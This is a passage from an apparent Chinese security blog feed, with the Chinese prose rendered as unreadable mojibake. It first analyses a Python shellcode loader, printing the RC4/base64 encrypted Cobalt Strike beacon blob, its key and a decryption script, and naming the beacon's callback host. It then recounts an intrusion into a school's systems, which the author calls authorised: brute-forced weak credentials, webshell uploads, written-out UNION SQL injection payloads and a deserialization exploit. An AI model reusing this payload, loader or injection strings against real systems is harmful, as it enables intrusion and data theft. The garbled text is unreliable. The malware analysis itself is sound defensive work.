text = base64.b64decode(text)  result = &#39;&#39;  key_len = len(key)  box = list(range(256))  j = 0  for i in range(256):     j = (j + box[i] + ord(key[(i % key_len)])) % 256     box[i], box[j] = box[j], box[i]  i = j = 0  for element in text:     i = (i + 1) % 256     j = (j + box[i]) % 256     box[i], box[j] = box[j], box[i]     k = chr(element ^ box[((box[i] + box[j]) % 256)])     result += k  return resultif __name__ == &#39;__main__&#39;:  b = &#39;24LfU140d71x8NG78Y79RFNXRJanRORJMeYHYusdrdthA5ze2q9sx7gEZUtrpysR9EkzxP5sNbhA9sHY2QCJ014rV3Ynumbfg1mGe87M/kmlAbd93FC0v13PI+mBOiDE5Plt9wqib1srOudHMS6PY79V14jwaF5RTo5Q76FcuYAg5vWyjU4wmquSknlf3DaN0/YpOuCn+qLiP8AlCYyy1j/8WzgVW87NdyzEO2HP5HZWfi0BiRXk8qopN8qMZjmltuE/FfgSza412HwM6d5vU7wuki4R5w3e2dzBSCQ6HSmSXc/rjKPLwkXhnKblzauanHQQUprU43eJ6A3FMLPyBwUUmXiE84r0pD0sR/YNBpI+xpayWRa/3hnWWaYAZNhZ5I82v2gUK1P0IQyXyLBHjGQejFptrZQE+5t2mJgOaIv+kgilCdHR7UsIyS3CDLlzX/241f6fmTUCTXon68Gey0bx3BYdMjIwpdCqxBBqJxyFNNqNhPYgQGWUZ1/GcGK4IN3+zFbS/Q+X8QQW2n9+r/lW/BAFF9bZbQTGPtt9GPfQNRObgy+ucbRkS/Ln+TZpxTtzW8pPmUdMtW1/tq1BHsnexwnRzyJeTEbTTOyvxj+uG0KGLfXMX9UbAnNHkNyhs/uPEKvB7Wv98FHmS8F0fokZQCBrv4xwE1b0fsBiq51t+i8ls+dfTyhdAC9tkkQS1j5HnSXiF4SP/ew3dISqoLp6gds6r+XhT1aLMQXmlnx8f7s+eUw9pydXiG5VmBjV8d/2AGsMuh7ZLTssXi5bgSL/U5S9D/dYt2U0O3O+UhmUE78PPn5aHX+ogmuXesn5AfnItZ7F66/cneKwcsdnUqKtWiW0SVHd75QTU+bnlIEgCE9iTqy2MZDPCeqGawxz28H3RGnCivK/48+7jPHEgNMmV7X5FFtnCSnuwDhyDSr6aIT82Ct8k7hoDuOSaPl00gTI2tT5NlhOt+4xepya0zyK/Os3R+P0tobg0hiSt6PhC6RiphkzC8mt+1a1ATqLnIoC7aw0I/eGDacgBXUwhSDNOK52fq3GnUZoTBOfWdHXs67qF2tQ2qEipNcI29gict6kZIwgwut6sK8F5R+njGdtUxeidh9g7tphQYOifvFzzQ5p78h2HSB6g/yETLZksR7xIOKYKILm5IkaU0jM+qI9IKh9+gjJXBcHPtGgmzDzFLdM2ObDr2vDFRDVylXVfUaGnZ4KmCN4Sn60WRSgH2SMjbL11wKPQ3H0dDZ7AsIDgskmaZa1f/02JYdiVAJF2379mpEQa/M89YpDEBVzlJRb8ikw3ON9PnH3zw4cvvs3uLjpfrV3zi5CPgCIa9u0DlE8aEsuLtFPszJA/Q+pQJTgHk1mt33MpQzDo/zCRAsCQ7/SjCa8ETECbvXrrOrC6gsEBrmTeRGzGOS2fxsxc2FB585NZXKHNWrwg6IS4myDWjTKUMy9GWyy8zd9hxvXyzNLKfZANZ2wnlSgpzYVb8Aj8Ln6cxCk+VKXh7zWc7JA+mD6GT2d9Y/n3a1RKgEYi/gtpwAPAWxhCiZsBeqfgtX9MFtv8AR/YU3g8VwRLswsJUo8iHwx9/RHtUGvkczLnphkQpJmuyVHb+stPkZc82wiUw63SX8va2mAnHcoOVW1di9HLQHwxKHKVPQ=&#39;  mm = &#39;king6666&#39;  c = rc4(b, mm.encode(&#39;utf-8&#39;))  code = bytearray(base64.b64decode(c))  shellCodeLoad(code)</code></pre><p>åˆ†æå¾—å‡ºè¯¥æ¶æ„æ ·æœ¬æ˜¯é€šè¿‡rc4ç®—æ³•è§£å¯†base64åŠ å¯†çš„shellcode</p><p>å¹¶ä¸”ä½¿ç”¨VirtualAllocå¼€è¾Ÿå†…å­˜ç©ºé—´æ”¾å…¥å†…å­˜ä¸­æ‰§è¡Œ</p><p><strong>ç¼–å†™è§£å¯†è„šæœ¬</strong></p><pre><code class="python">import ctypes, urllib, base64, requests, hashlibdef rc4(text, key):  key = hashlib.md5(key).hexdigest()  text = base64.b64decode(text)  result = &#39;&#39;  key_len = len(key)  box = list(range(256))  j = 0  for i in range(256):     j = (j + box[i] + ord(key[(i % key_len)])) % 256     box[i], box[j] = box[j], box[i]  i = j = 0  for element in text:     i = (i + 1) % 256     j = (j + box[i]) % 256     box[i], box[j] = box[j], box[i]     k = chr(element ^ box[((box[i] + box[j]) % 256)])     result += k  return resultb = &#39;24LfU140d71x8NG78Y79RFNXRJanRORJMeYHYusdrdthA5ze2q9sx7gEZUtrpysR9EkzxP5sNbhA9sHY2QCJ014rV3Ynumbfg1mGe87M/kmlAbd93FC0v13PI+mBOiDE5Plt9wqib1srOudHMS6PY79V14jwaF5RTo5Q76FcuYAg5vWyjU4wmquSknlf3DaN0/YpOuCn+qLiP8AlCYyy1j/8WzgVW87NdyzEO2HP5HZWfi0BiRXk8qopN8qMZjmltuE/FfgSza412HwM6d5vU7wuki4R5w3e2dzBSCQ6HSmSXc/rjKPLwkXhnKblzauanHQQUprU43eJ6A3FMLPyBwUUmXiE84r0pD0sR/YNBpI+xpayWRa/3hnWWaYAZNhZ5I82v2gUK1P0IQyXyLBHjGQejFptrZQE+5t2mJgOaIv+kgilCdHR7UsIyS3CDLlzX/241f6fmTUCTXon68Gey0bx3BYdMjIwpdCqxBBqJxyFNNqNhPYgQGWUZ1/GcGK4IN3+zFbS/Q+X8QQW2n9+r/lW/BAFF9bZbQTGPtt9GPfQNRObgy+ucbRkS/Ln+TZpxTtzW8pPmUdMtW1/tq1BHsnexwnRzyJeTEbTTOyvxj+uG0KGLfXMX9UbAnNHkNyhs/uPEKvB7Wv98FHmS8F0fokZQCBrv4xwE1b0fsBiq51t+i8ls+dfTyhdAC9tkkQS1j5HnSXiF4SP/ew3dISqoLp6gds6r+XhT1aLMQXmlnx8f7s+eUw9pydXiG5VmBjV8d/2AGsMuh7ZLTssXi5bgSL/U5S9D/dYt2U0O3O+UhmUE78PPn5aHX+ogmuXesn5AfnItZ7F66/cneKwcsdnUqKtWiW0SVHd75QTU+bnlIEgCE9iTqy2MZDPCeqGawxz28H3RGnCivK/48+7jPHEgNMmV7X5FFtnCSnuwDhyDSr6aIT82Ct8k7hoDuOSaPl00gTI2tT5NlhOt+4xepya0zyK/Os3R+P0tobg0hiSt6PhC6RiphkzC8mt+1a1ATqLnIoC7aw0I/eGDacgBXUwhSDNOK52fq3GnUZoTBOfWdHXs67qF2tQ2qEipNcI29gict6kZIwgwut6sK8F5R+njGdtUxeidh9g7tphQYOifvFzzQ5p78h2HSB6g/yETLZksR7xIOKYKILm5IkaU0jM+qI9IKh9+gjJXBcHPtGgmzDzFLdM2ObDr2vDFRDVylXVfUaGnZ4KmCN4Sn60WRSgH2SMjbL11wKPQ3H0dDZ7AsIDgskmaZa1f/02JYdiVAJF2379mpEQa/M89YpDEBVzlJRb8ikw3ON9PnH3zw4cvvs3uLjpfrV3zi5CPgCIa9u0DlE8aEsuLtFPszJA/Q+pQJTgHk1mt33MpQzDo/zCRAsCQ7/SjCa8ETECbvXrrOrC6gsEBrmTeRGzGOS2fxsxc2FB585NZXKHNWrwg6IS4myDWjTKUMy9GWyy8zd9hxvXyzNLKfZANZ2wnlSgpzYVb8Aj8Ln6cxCk+VKXh7zWc7JA+mD6GT2d9Y/n3a1RKgEYi/gtpwAPAWxhCiZsBeqfgtX9MFtv8AR/YU3g8VwRLswsJUo8iHwx9/RHtUGvkczLnphkQpJmuyVHb+stPkZc82wiUw63SX8va2mAnHcoOVW1di9HLQHwxKHKVPQ=&#39;mm = &#39;king6666&#39;c = rc4(b, mm.encode(&#39;utf-8&#39;))code = bytearray(base64.b64decode(c))print(code)</code></pre><p>å¾—åˆ°å…¶shellcode</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192048026.png" alt="image"></p><p>å›è¿åœ°å€ä¸º<a href="http://www.alibababaa.com/">www.alibababaa.com</a></p><p>ä¸ºå…¸å‹çš„cobaltstrike https x64 beacon shellcode</p><p>è‡³æ­¤ï¼Œåˆ†æç»“æŸ</p><h2 id="0x02-åè¨€"><a href="#0x02-åè¨€" class="headerlink" title="0x02 åè¨€"></a>0x02 åè¨€</h2><p>åæ¥åšè¿™ä»½æ ·æœ¬çš„åŒå­¦é€šè¿‡å¾®ä¿¡å…¬ä¼—å·è”ç³»åˆ°äº†æˆ‘ï¼Œå“ˆå“ˆå“ˆï¼Œè¯´å½“æ—¶çœ‹åˆ°æ˜¯è‡ªå·±çš„åŸŸåéš¾å—çš„ä¸€ç¬”ï¼Œè¢«å„ç§æ‹‰é»‘</p><p>èæ°´ç›¸é€¢å°½æ˜¯ä»–ä¹¡ä¹‹å®¢</p>]]></content>
      
      
      
        <tags>
            
            <tag> æ ·æœ¬åˆ†æ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è®°ä¸€æ¬¡å¥‡å¦™çš„å­¦æ ¡æ¸—é€ä¹‹æ—…</title>
      <link href="/2020/11/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A5%87%E5%A6%99%E7%9A%84%E5%AD%A6%E6%A0%A1%E6%B8%97%E9%80%8F%E4%B9%8B%E6%97%85/"/>
      <url>/2020/11/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A5%87%E5%A6%99%E7%9A%84%E5%AD%A6%E6%A0%A1%E6%B8%97%E9%80%8F%E4%B9%8B%E6%97%85/</url>
      
        <content type="html"><![CDATA[<h3 id="0x01-èµ·å› "><a href="#0x01-èµ·å› " class="headerlink" title="0x01 èµ·å› "></a>0x01 èµ·å› </h3><p>ç”±äºç–«æƒ…é—®é¢˜ï¼Œå­¦æ ¡çš„æ˜“ç­APPæ–°å¢äº†æ‰“å¡ç³»ç»Ÿï¼Œæ¯å¤©éœ€è¦è¿›è¡Œæ™¨æ£€ï¼Œåˆæ£€æ‰“å¡ï¼Œå¿˜è®°çš„è¯å°±æ˜¯ä¸Šåƒå­—æ£€è®¨</p><p>æœ¬äººå¯¹äºè¿™ç§â€œå½¢å¼ä¸»ä¹‰â€æ·±æ„Ÿä¸æ»¡ï¼Œäºæ˜¯å‡†å¤‡æ“ä½œä¸€ç•ª</p><p><img src="https://i.loli.net/2020/11/13/9tK5Iyozsp4rPq7.jpg" alt="IMG_20201030_190004"></p><p>éå¸¸å¹¸è¿ï¼Œæ ¡çº§â€œæ˜“ç­â€ç³»ç»Ÿçš„è´Ÿè´£äººå°±æ˜¯æˆ‘ä»¬å›¢é˜Ÿçš„æŒ‡å¯¼è€å¸ˆï¼Œ</p><p>åœ¨å–å¾—ä»–çš„æˆæƒåï¼Œä¾¿å¼€å§‹äº†å¯¹äºæ˜“ç­ç³»ç»Ÿçš„æ›²æŠ˜è€Œåˆç²¾å½©çš„æ¸—é€</p><p><strong>åœ¨æ­¤é¸£è°¢M78secçš„æ‰€æœ‰æˆå‘˜</strong></p><h3 id="0x02è¸©ç‚¹"><a href="#0x02è¸©ç‚¹" class="headerlink" title="0x02è¸©ç‚¹"></a>0x02è¸©ç‚¹</h3><p>åŸºæœ¬çš„ä¿¡æ¯æœé›†å’±ä»¬å°±ä¸å¤šè¯´äº†</p><p>æ ¹æ®è€å¸ˆå£è¿°ï¼Œè¯¥åŸŸåä¸‹éƒ¨ç½²æœ‰å¤šé¡¹åŠŸèƒ½ç³»ç»Ÿï¼ˆåŒ…æ‹¬è´Ÿè½½å‡è¡¡ï¼Œç›´æ’­ï¼Œè¡¨ç™½å¢™ï¼Œæ‰“å¡ç­¾åˆ°ç³»ç»Ÿï¼Œå¿ƒç†æµ‹è¯•ç³»ç»Ÿç­‰ç­‰ï¼‰ï¼Œå› æ­¤ä¸åŒç³»ç»Ÿä½¿ç”¨äº†ä¸åŒçš„å¤šå°æœåŠ¡å™¨</p><p>çœ‹æ ·ä¸èƒ½ä¸€åŠ³æ°¸é€¸ï¼Œéœ€è¦å„ä¸ªç³»ç»Ÿã€æœåŠ¡å™¨é€ä¸ªå‡»ç ´ï¼Œç„¶åæ‘¸å…¥æ ¸å¿ƒç³»ç»Ÿä¸­</p><p>é¦–å…ˆæ‰“å¼€â€œæ˜“ç­â€ç³»ç»Ÿçš„é¦–é¡µæ˜¯è¿™ä¸ªæ ·å­</p><p><img src="https://i.loli.net/2020/11/13/L9kfsIgtYWw8PdC.png" alt="image-20201113133208461"></p><p>ä¸éš¾çœ‹å‡ºï¼Œå¼€å‘è€…ä½¿ç”¨äº†TPæ¡†æ¶ï¼Œåœ¨ç®€å•åœ°æµ‹è¯•äº†å„ç§TP æ³¨å…¥ï¼ŒRCEçš„payloadåå‡ä»¥å¤±è´¥å‘Šç»ˆï¼Œçœ‹æ ·å®‰å…¨æ„è¯†è¿˜ä¸ç®—å¤ªå·®</p><p>åŸŸåä¸‹çš„é¦–é¡µå®Œå…¨å°±æ˜¯ä¸€ä¸ªæŠ¥é”™é¡µé¢ï¼Œæ²¡æœ‰ä»»ä½•åŠŸèƒ½ç‚¹å’Œä¿¡æ¯</p><p>ä¿—è¯è¯´å¾—å¥½ï¼Œä¿¡æ¯æœé›†çš„å¥½åç›´æ¥å†³å®šäº†æˆ‘ä»¬æ¸—é€çš„æˆè´¥ï¼Œå› æ­¤æˆ‘ä»¬ç»å¯¹ä¸èƒ½ç–å¿½å¤§æ„ã€‚</p><p>æˆ‘ä»¬å…ˆæ¥fuzzä¸€çº§ç›®å½•</p><p><img src="https://i.loli.net/2020/11/13/9TvMCqsmjP8n5yK.png" alt="image-20201113134315588"></p><p>æˆæœè¿˜ä¸é”™ï¼Œä¸å°‘ç›®å½•å’ŒåŠŸèƒ½ç‚¹ï¼Œéšåæˆ‘ä»¬ç»§ç»­fuzzå„ä¸ªä¸€çº§ç›®å½•çš„äºŒçº§ç›®å½•ï¼Œä¸æ–­æ‘¸ç´¢è¯¥åŸŸåä¸‹éƒ¨ç½²çš„åŠŸèƒ½ç‚¹</p><p>å…·ä½“çš„å°±ä¸ä¸Šå›¾äº†ï¼Œå› ä¸ºä¸€çº§ç›®å½•å¤ªå¤šäº†ã€‚</p><p>äº†è§£æ¸…æ¥šåŠŸèƒ½ç‚¹åï¼Œç›´æ¥è„±è£¤å­å¼€å¹²</p><h3 id="0x03-å¿ƒç†å¥åº·ç³»ç»Ÿçš„æ¸—é€ï¼ˆIISçŸ­æ–‡ä»¶åâ€“-gt-è€ç™»å½•å£â€“-gt-çˆ†ç ´â€“-gt-æ–°ç™»å½•å£â€“-gt-ä¸Šä¼ ï¼‰"><a href="#0x03-å¿ƒç†å¥åº·ç³»ç»Ÿçš„æ¸—é€ï¼ˆIISçŸ­æ–‡ä»¶åâ€“-gt-è€ç™»å½•å£â€“-gt-çˆ†ç ´â€“-gt-æ–°ç™»å½•å£â€“-gt-ä¸Šä¼ ï¼‰" class="headerlink" title="0x03 å¿ƒç†å¥åº·ç³»ç»Ÿçš„æ¸—é€ï¼ˆIISçŸ­æ–‡ä»¶åâ€“&gt;è€ç™»å½•å£â€“&gt;çˆ†ç ´â€“&gt;æ–°ç™»å½•å£â€“&gt;ä¸Šä¼ ï¼‰"></a>0x03 å¿ƒç†å¥åº·ç³»ç»Ÿçš„æ¸—é€ï¼ˆIISçŸ­æ–‡ä»¶åâ€“&gt;è€ç™»å½•å£â€“&gt;çˆ†ç ´â€“&gt;æ–°ç™»å½•å£â€“&gt;ä¸Šä¼ ï¼‰</h3><p>é€šè¿‡ä¸€çº§ç›®å½•çˆ†ç ´ï¼Œçˆ†ç ´å‡º</p><p><a href="http://xxx.xxx.edu.cn/psy%E8%BF%99%E4%B8%AA%E8%B7%AF%E5%BE%84">http://xxx.xxx.edu.cn/psyè¿™ä¸ªè·¯å¾„</a></p><p>å‘ç°å…¶ä¸­éƒ¨ç½²äº†å¿ƒç†æ•™è‚²å¥åº·ç³»ç»Ÿï¼Œä¸­é—´ä»¶ä¸ºIIS</p><p>ä½†æ˜¯å¿ƒç†å¥åº·ç³»ç»Ÿç™»å½•å£æœ‰éªŒè¯ç æœºåˆ¶ï¼Œè€Œä¸”éªŒè¯ç ä¸å®¹æ˜“è¯†åˆ«</p><p><img src="https://i.loli.net/2020/11/13/sfTZbxvCE6re7LH.png" alt="image-20201113135959569"></p><p>ç«‹é©¬æƒ³åˆ°iisçŸ­æ–‡ä»¶åç‰¹æ€§</p><p>éšåé€šè¿‡iisçŸ­æ–‡ä»¶åç›®å½•æ‰«æå·¥å…·ï¼ˆ<a href="https://github.com/lijiejie/IIS_shortname_Scanner%EF%BC%89%E8%BF%9B%E8%A1%8C%E6%89%AB%E6%8F%8F">https://github.com/lijiejie/IIS_shortname_Scannerï¼‰è¿›è¡Œæ‰«æ</a></p><p>!(<a href="https://i.loli.net/2020/11/13/eBsFcAxPQ84OJi1.jpg">https://i.loli.net/2020/11/13/eBsFcAxPQ84OJi1.jpg</a>) </p><p>è·å–åˆ°è€çš„å…¶ä»–ç³»ç»Ÿç™»å½•å£</p><p><a href="http://xxx.xxx.edu.cn/psy/Login2.aspx">http://xxx.xxx.edu.cn/psy/Login2.aspx</a></p><p><img src="https://i.loli.net/2020/11/13/rwOx7TJbjAasNU1.png" alt="image-20201113135355472"></p><p>å¦‚å›¾ï¼Œæ²¡æœ‰ä»»ä½•éªŒè¯ç æœºåˆ¶</p><p>ç›´æ¥Burp Cluster bombå¼çˆ†ç ´</p><p>æˆåŠŸå¾—åˆ°å…¶ä»–ç³»ç»Ÿçš„å¼±å£ä»¤admin,Aa123456</p><p>ä½†æ˜¯è€ç³»ç»Ÿå…¶ä»–é¡µé¢å·²ç»åˆ é™¤ï¼Œæ— æ³•æ­£å¸¸ç™»å…¥åå°</p><p><img src="https://i.loli.net/2020/11/13/6sFRtDz81TpKvVy.png" alt="image-20201113140106639"></p><p>å…«å˜å‘€è·¯ï¼Œä¸æ˜¯è‰¯æ°‘çš„å¹²æ´»ï¼</p><p>ä½†æ¨æµ‹æ–°è€ç³»ç»Ÿç”¨çš„åŒä¸€ä¸ªæ•°æ®åº“</p><p>è®¿é—®æ–°ç³»ç»Ÿ</p><p><a href="http://xxx.xxx.edu.cn/psy/Login.aspx">http://xxx.xxx.edu.cn/psy/Login.aspx</a></p><p>ä½¿ç”¨å¯†ç admin,Aa123456æˆåŠŸç™»é™†</p><p><img src="https://i.loli.net/2020/11/13/97j31IzLdiktCEg.png" alt="image-20201113140540357"> </p><p>åå°ç¿»æ‰¾ä¸Šä¼ ç‚¹</p><p>ä¸Šä¼ ç‚¹åœ¨</p><p><a href="http://xxx.xxx.edu.cn/psy/ScaleManage/ScaleEdit.aspx?ScaleListID=1">http://xxx.xxx.edu.cn/psy/ScaleManage/ScaleEdit.aspx?ScaleListID=1</a></p><p>é‡è¡¨å¹³å°è¿™è¾¹çš„æ·»åŠ é¢˜ç›®å­˜åœ¨ä»»æ„æ–‡ä»¶ä¸Šä¼ (è¯è¯´è¿™ä¸ªä¸Šä¼ ç‚¹â€¦å¯ä»¥è¯´æ˜¯ç›¸å½“éšè”½äº†..æ‰¾äº†å¥½ä¹…æ‰æ‰¾åˆ°)</p><p><img src="https://i.loli.net/2020/11/13/qYmMlw6O5EaHkds.png" alt="image-20201113140741415"> </p><p>ä¸Šä¼ aspxä¼šè«åå…¶å¦™è·³è½¬ï¼Œaspä¸è§£æï¼Œç›´æ¥ä¼ äº†ä¸ªasmxçš„é©¬</p><p>é€šè¿‡awvs 10çš„è°ƒè¯•æ¨¡å—æ‰§è¡Œå‘½ä»¤</p><p><img src="https://img2020.cnblogs.com/blog/1771833/202112/1771833-20211221210801913-1610515774.png" alt="image"></p><p>æƒé™ä¸ºnet service</p><p>ä½¿ç”¨cobaltstrikeç›´æ¥powershellä¸€å¥è¯ä¸Šæƒé™</p><p><img src="https://i.loli.net/2020/11/13/JhNuE2WT1ItbUco.png" alt="image-20201113141153516"></p><p>ç»“æœè¡¥ä¸è²Œä¼¼æ¯”è¾ƒæ­»ã€‚ã€‚</p><p>å„ç§æœ¬åœ°ææƒExpä¸Šäº†ä¸€éï¼Œæ²¡ä»€ä¹ˆé€¼ç”¨</p><p>Comç»„ä»¶ï¼ŒåœŸè±†ä¸Šäº†ä¹Ÿæä¸ä¸‹æ¥ï¼Œå…ˆè¿™æ ·å§ï¼Œææƒè¦æ˜¯æä¸‹æ¥äº†å†è¡¥å……</p><p>å¿ƒç†å¥åº·ç³»ç»Ÿå®£å¸ƒåˆæ­¥æ‹¿ä¸‹</p><h3 id="0x04-ç›´æ’­ç³»ç»Ÿæ¥å£æ³¨å…¥"><a href="#0x04-ç›´æ’­ç³»ç»Ÿæ¥å£æ³¨å…¥" class="headerlink" title="0x04 ç›´æ’­ç³»ç»Ÿæ¥å£æ³¨å…¥"></a>0x04 ç›´æ’­ç³»ç»Ÿæ¥å£æ³¨å…¥</h3><p>åœ¨è¿›å…¥ç›´æ’­ç³»ç»Ÿåï¼Œå‘ç°æ²¡ä»€ä¹ˆå¯ä»¥åˆ©ç”¨çš„ç‚¹ï¼Œå¤§æ¦‚å¼€å‘è¿˜æ²¡æœ‰å®Œæˆ</p><p><a href="https://imgchr.com/i/DpP1rn"><img src="https://s3.ax1x.com/2020/11/13/DpP1rn.png" alt="DpP1rn.png"></a></p><p>ä½†æ˜¯åœ¨BURPä¸­ï¼Œæˆ‘å‘ç°äº†ä¸€ä¸ªajaxæ¥å£çš„è¯·æ±‚,ä¸‹ä½“ä¸€ç¡¬</p><p><img src="https://i.loli.net/2020/11/13/LMeBq46tPazNXKo.png" alt="image-20201113142150278"></p><p>httpè¯·æ±‚å¦‚ä¸‹</p><pre><code>POST /index.php/Live/index/seat_ajax.html HTTP/1.1Host: xxx.xxx.edu.cnContent-Length: 24Accept: */*Origin: http://xxx.xxx.edu.cnX-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Linux; U; Android 5.1; zh-CN; 1501_M02 Build/LMY47D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.0.818 U3/0.8.0 Mobile Safari/534.30Content-Type: application/x-www-form-urlencoded; charset=UTF-8Referer: http://xxx.xxx.edu.cn/index.php/Live/index/seat?place_id=10&amp;active_id=20Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en;q=0.8Cookie: ASP.NET_SessionId=s0clwrginz0rw3x0smtwtsgg; PHPSESSID=7985bf0a5f38e5922a651ac1f4ef9b1a; PHPSESSID=7985bf0a5f38e5922a651ac1f4ef9b1aConnection: close place_id=10&amp;active_id=20</code></pre><p> <img src="https://i.loli.net/2020/11/13/eI6CjpW8L5BRYwN.png" alt="image-20201113141807391"></p><p>è¿›è¡Œfuzzæ‰¾åˆ°SQLI Payload</p><p><img src="https://i.loli.net/2020/11/14/RSwQrOYcgzAtW4V.png" alt="image-20201114103336060"></p><p>ä¸¤ä¸ªidå‚æ•°éƒ½å­˜åœ¨unionæ³¨å…¥</p><p><a href="https://imgchr.com/i/DpuwbF"><img src="https://s3.ax1x.com/2020/11/13/DpuwbF.png" alt="DpuwbF.png"></a></p><p>æ„é€ payload</p><p><code>) UNION ALL SELECT NULL,NULL,NULL,NULL,user(),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- Neqy</code></p><p>å¦‚å›¾æˆåŠŸè·å¾—current_userä¿¡æ¯</p><p><a href="mailto:\">â€œ_root@10.40.0.22</a></p><p>æ„é€ payload</p><p><code>place_id=10) UNION ALL SELECT NULL,NULL,NULL,NULL,group_concat(SCHEMA_NAME),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL from information_schema.schemata-- Neqy&amp;active_id=20&amp;active_id=20</code></p><p> <img src="https://i.loli.net/2020/11/13/PDj1oTOUBwv9zQc.png" alt="image-20201113142647096"></p><p>å…¶ä»–çš„è¡¨ã€åˆ—ã€æ•°æ®ã€åœ¨æ­¤å°±ä¸æ¼”ç¤ºäº†ï¼Œå†™è¯­å¥å°±okï¼Œéƒ½éå¸¸ç®€å•</p><p>SQLMAPè‡ªåŠ¨åŒ–æ¼”ç¤ºå¦‚å›¾</p><p><img src="https://img2020.cnblogs.com/blog/1771833/202112/1771833-20211221211028612-464219720.png" alt="image"></p><p>åé¢å‘ç°æ¶‰åŠäº†å¾ˆå¤šå…¶ä»–ç³»ç»Ÿçš„åº“ï¼Œä½†å¹¶æ²¡æœ‰æ‘¸åˆ°æˆ‘æœ€æƒ³è¦çš„æ ¸å¿ƒç³»ç»Ÿçš„åº“ï¼Œå› æ­¤æ¸—é€è¿˜å¾—ç»§ç»­</p><h3 id="0X05-ä¸€ä¸ªå¹³æ·¡æ— å¥‡çš„B64ä¸Šä¼ "><a href="#0X05-ä¸€ä¸ªå¹³æ·¡æ— å¥‡çš„B64ä¸Šä¼ " class="headerlink" title="0X05 ä¸€ä¸ªå¹³æ·¡æ— å¥‡çš„B64ä¸Šä¼ "></a>0X05 ä¸€ä¸ªå¹³æ·¡æ— å¥‡çš„B64ä¸Šä¼ </h3><p>FUZZåŠŸèƒ½ç‚¹åï¼Œæ‰¾åˆ°äº†ä¸€ä¸ªæœªæˆæƒå¯ä»¥ä¸Šä¼ å›¾ç‰‡çš„åœ°æ–¹</p><p><a href="http://xxx.xxx.edu.cn/v4/public/weui/demo/form12.html">http://xxx.xxx.edu.cn/v4/public/weui/demo/form12.html</a></p><p><a href="https://imgchr.com/i/DpAWkt"><img src="https://s3.ax1x.com/2020/11/13/DpAWkt.png" alt="DpAWkt.png"></a></p><p><a href="https://imgchr.com/i/DpKYIH"><img src="https://s3.ax1x.com/2020/11/13/DpKYIH.png" alt="DpKYIH.png"></a></p><p>å‘ç°data:image&#x2F;jpegæ—¶ä¸Šä¼ jpegå›¾ç‰‡</p><p>ç›´æ¥æ”¹dataæ”¹ä¸ºimage&#x2F;php,ç„¶åå°†ä¸Šä¼ å†…å®¹base64ç¼–ç åæäº¤</p><p><img src="https://i.loli.net/2020/11/13/CHZ1PhFIdBJEwo2.png" alt="image-20201113144832373"></p><p>GetshellæˆåŠŸï¼ŒSYSTEMæƒé™ï¼Œææƒéƒ½çœäº†</p><p>!(<a href="https://i.loli.net/2020/11/13/cRyQC3XMA2duFG8.jpg">https://i.loli.net/2020/11/13/cRyQC3XMA2duFG8.jpg</a>)</p><h3 id="0X06-æ ¸å¿ƒç³»ç»Ÿç²¾å½©æ¸—é€ï¼ˆNdayååºåˆ—åŒ–-å‘½ä»¤æ‰§è¡Œç»•è¿‡-æ¡ä»¶ç«äº‰Getshellï¼‰"><a href="#0X06-æ ¸å¿ƒç³»ç»Ÿç²¾å½©æ¸—é€ï¼ˆNdayååºåˆ—åŒ–-å‘½ä»¤æ‰§è¡Œç»•è¿‡-æ¡ä»¶ç«äº‰Getshellï¼‰" class="headerlink" title="0X06 æ ¸å¿ƒç³»ç»Ÿç²¾å½©æ¸—é€ï¼ˆNdayååºåˆ—åŒ–+å‘½ä»¤æ‰§è¡Œç»•è¿‡+æ¡ä»¶ç«äº‰Getshellï¼‰"></a>0X06 æ ¸å¿ƒç³»ç»Ÿç²¾å½©æ¸—é€ï¼ˆNdayååºåˆ—åŒ–+å‘½ä»¤æ‰§è¡Œç»•è¿‡+æ¡ä»¶ç«äº‰Getshellï¼‰</h3><p>å¯»å¯»è§…è§…ï¼Œå†·å†·æ¸…æ¸…ï¼Œå‡„å‡„æƒ¨æƒ¨å‡„å‡„ï¼Œç»ˆäºæ‰¾åˆ°äº†æˆ‘ä»¬çš„æ§åˆ¶â€œæ˜“ç­â€æ ¸å¿ƒç³»ç»Ÿ</p><p><a href="http://xxx.xxx.edu.cn/v4/public/index.php/admin/login.html?s=admin/api.Update/tree">http://xxx.xxx.edu.cn/v4/public/index.php/admin/login.html?s=admin/api.Update/tree</a></p><p><img src="https://i.loli.net/2020/11/13/isfrbkZp7SVD6X8.png" alt="image-20201113145542691"></p><p>èƒœåˆ©å°±åœ¨çœ¼å‰â€¦ä¸ç¡è§‰ä¹Ÿè¦æŠŠä»–ç»™æä¸‹æ¥</p><p>å„ç§fuzzï¼Œå„ç§æ“ä½œä¸€å—å®‰æ’ä¸Šå»ï¼Œå‘ç°å¹¶æ²¡æœ‰ä»€ä¹ˆåµç”¨ï¼Œä¾æ—§æ—¥ä¸è¿›å»</p><p>éš¾é“å°±æ­¤æ”¾å¼ƒï¼Ÿï¼Ÿä¸å¯èƒ½ï¼Œè¿™ä¸æ˜¯æˆ‘ä»¬çš„é£æ ¼</p><p>æˆ‘åœ¨ä»”ç»†æŸ¥çœ‹é¡µé¢JSçš„æ—¶å€™ï¼Œå‘ç°äº†è¿™æ ·ä¸€ä¸ªæœ‰è¶£çš„ä¿¡æ¯</p><p><img src="https://i.loli.net/2020/11/13/1vFsBm49guR3VaU.png" alt="image-20201113145944166"></p><p>çœ¼å‰ä¸€äº®ï¼Œå¦ˆçš„ThinkAdminï¼Œæ­£å¥½ä¹‹å‰æ”¶è—äº†ä¸ªååºåˆ—åŒ–çš„Ndayï¼Œå®‰æ’ä¸Šï¼</p><p><img src="https://i.loli.net/2020/11/13/yJ89hnIeBSXvOos.jpg" alt="image-20201113145944166"></p><p><a 